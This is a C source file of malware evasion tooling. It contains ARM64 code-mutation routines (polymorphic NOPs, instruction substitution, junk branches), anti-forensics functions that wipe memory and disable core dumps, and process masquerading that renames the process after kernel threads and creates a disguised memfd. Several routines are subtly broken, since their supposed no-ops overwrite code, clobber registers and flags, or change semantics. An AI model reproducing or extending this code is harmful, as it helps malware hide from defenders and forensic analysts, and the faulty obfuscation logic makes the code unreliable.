#include "common.h"


static const uint32_t arm64_nop_variants[] = {
    0xD503201F,  // nop          
    0xAA1F03E0,  // mov x0, xzr  
    0xAA0003E0,  // mov x0, x0  
    0xD2800000,  // mov x0, #0   
    0x52800000,  // mov w0, #0   
    0x91000000,  // add x0, x0, #0 
    0xD1000000,  // sub x0, x0, #0 
    0x8A1F0000,  // and x0, x0, xzr
};


typedef struct {
    uint32_t original;
    uint32_t substitute;
    uint32_t mask;  
} arm64_substitution_t;

static const arm64_substitution_t arm64_substitutions[] = {
    // mov x0, x1 -> orr x0, x1, xzr (functionally equivalent)
    {0xAA0103E0, 0xAA1F0020, 0xFFE0FFE0},

    // add x0, x0, #0 -> sub x0, x0, #0 (both do nothing)
    {0x91000000, 0xD1000000, 0xFF000000},

    // mov x0, #imm -> movz x0, #imm (different encoding)
    {0xD2800000, 0x52800000, 0xFF800000},
};

// Generate polymorphic NOPs for ARM64
void generate_polymorphic_nops_arm64(uint8_t* buffer, size_t count) {
    if (!buffer || count < 4) return;

    uint32_t* inst_buffer = (uint32_t*)buffer;
    size_t nop_count = count / 4;

    for (size_t i = 0; i < nop_count; i++) {

        int variant = rand() % (sizeof(arm64_nop_variants) / sizeof(arm64_nop_variants[0]));
        inst_buffer[i] = arm64_nop_variants[variant];

        if (variant >= 1 && variant <= 4) {
            uint32_t reg_bits = (rand() % 31) << 5;  
            inst_buffer[i] |= reg_bits;
        }
    }
}

void substitute_instructions_arm64(uint8_t* code, size_t len) {
    if (!code || len < 4) return;

    uint32_t* instructions = (uint32_t*)code;
    size_t inst_count = len / 4;

    for (size_t i = 0; i < inst_count; i++) {
        for (size_t j = 0; j < sizeof(arm64_substitutions) / sizeof(arm64_substitutions[0]); j++) {
            const arm64_substitution_t* sub = &arm64_substitutions[j];

            if ((instructions[i] & sub->mask) == sub->original) {
                if (rand() % 100 < 30) {
                    instructions[i] = sub->substitute | (instructions[i] & ~sub->mask);
                }
            }
        }
    }
}

void obfuscate_control_flow_arm64(uint8_t* code, size_t len) {
    if (!code || len < 12) return;  

    uint32_t* instructions = (uint32_t*)code;
    size_t inst_count = len / 4;

    size_t max_insertions = (inst_count > 100) ? 10 : inst_count / 10;
    size_t insertions_made = 0;

    for (size_t i = 0; i < inst_count - 3 && insertions_made < max_insertions; i++) {
        uint32_t inst = instructions[i];
        
        if ((inst & 0xFF000010) == 0x54000000) {
            
            if (rand() % 100 < 15) {  
                if (i + 2 < inst_count - 2) {
                    for (size_t j = inst_count - 1; j > i; j--) {
                        if (j + 2 < inst_count) {
                            instructions[j + 2] = instructions[j];
                        }
                    }

                    // Insert dummy condition that's always false
                    instructions[i] = 0xF1000000;      // subs x0, x0, #0 (sets flags)
                    instructions[i + 1] = 0x54000020;  // b.eq +4 (never taken)

                    i += 2;  // Skip the inserted instructions
                    insertions_made++;
                }
            }
        }
    }
}


void apply_arm64_obfuscation(uint8_t* code, size_t len) {
    if (!code || len < 4) return;

    srand(time(NULL) ^ (uintptr_t)code);

    if (len >= 64) {  // Ensure we have space
        generate_polymorphic_nops_arm64(code, 32);  // 8 instructions of NOPs
    }
    

    // Apply instruction substitution
    
    substitute_instructions_arm64(code, len);
    

    // Apply control flow obfuscation (most complex, apply last)
    
    obfuscate_control_flow_arm64(code, len);
    

}

// Enhanced anti-forensics functions
void secure_memory_wipe(void* ptr, size_t size) {
    if (!ptr || size == 0) return;

    volatile uint8_t* mem = (volatile uint8_t*)ptr;

    for (int pass = 0; pass < 3; pass++) {
        for (size_t i = 0; i < size; i++) {
            switch (pass) {
                case 0: mem[i] = 0x00; break;      // Zeros
                case 1: mem[i] = 0xFF; break;      // Ones  
                case 2: mem[i] = (uint8_t)rand(); break;  // Random
            }
        }
    }
}

void prevent_core_dumps(void) {
    struct rlimit rl;
    rl.rlim_cur = 0;
    rl.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rl);
}

void hide_process_title(int argc, char* argv[]) {
    if (argc > 0 && argv && argv[0]) {
        
        size_t orig_len = strlen(argv[0]);
        memset(argv[0], 0, orig_len);

        // Set innocent process name
        const char* innocent_name = get_random_innocent_name();
        strncpy(argv[0], innocent_name, orig_len - 1);
        argv[0][orig_len - 1] = '\0';

        // Update process title via prctl
        prctl(PR_SET_NAME, innocent_name, 0, 0, 0);
    }
}



static const char* innocent_process_names[] = {
    "[kworker/0:1]",      // Kernel worker thread
    "[ksoftirqd/0]",      // Kernel soft IRQ daemon
    "[migration/0]",      // CPU migration thread  
    "[rcu_gp]",           // RCU grace period
    "[watchdog/0]",       // Watchdog thread
    "[kcompactd0]",       // Memory compaction
    "[kswapd0]",          // Memory swap daemon
    "[systemd-journal]",  // System journal (if not too suspicious)
};

const char* get_random_innocent_name(void) {
    static int initialized = 0;
    if (!initialized) {
        srand(time(NULL));
        initialized = 1;
    }

    int index = rand() % (sizeof(innocent_process_names) / sizeof(innocent_process_names[0]));
    return innocent_process_names[index];
}

int create_masqueraded_memfd(void) {
    const char* innocent_name = get_random_innocent_name();
    return syscall2(__NR_memfd_create, (long)innocent_name, 0);
}